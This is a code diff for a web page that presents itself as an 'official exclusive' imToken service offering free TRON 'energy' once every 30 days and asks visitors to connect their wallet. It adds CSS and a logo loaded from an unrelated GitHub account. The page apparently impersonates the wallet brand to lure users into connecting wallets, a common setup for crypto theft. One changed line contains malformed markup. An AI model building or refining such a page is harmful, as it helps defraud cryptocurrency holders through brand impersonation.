@@ -73,7 +73,16 @@ body {
     padding: 0;
     border-bottom: none;
     margin-bottom: 0;
-    display: block;
+    display: flex; /* 新增：flex布局让Logo和文字同行 */
+    align-items: center; /* 新增：垂直居中 */
+    gap: 8px; /* 新增：Logo和文字间距 */
+}
+/* 新增：Logo样式 */
+.header-logo {
+    width: 36px; /* 适配文字高度，保持比例 */
+    height: 36px;
+    border-radius: 4px; /* 轻微圆角更美观 */
+    object-fit: cover;
 }
 .header h1 { 
     font-size: 20px; /* 恢复原字体大小 */
@@ -285,15 +294,19 @@ body {
         <!-- 新增：标题+语言切换同一行 -->
         <div class="header-container">
             <div class="header">
-                <h1 id="headerTitle">imToken</h1>
-                <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
+                <!-- 新增：Logo图片（路径与仓库中log.png一致） -->
+                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
+                <div>
+                    <h1 id="headerTitle">imToken</h1>
+                    <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
+                </div>
             </div>
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
-                  <i class="fa fa-globe"></i>
+                  <<i class="fa fa-globe"></</i>
                 </button>
             </div>
-        </div>   
+        </div>
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span></span>
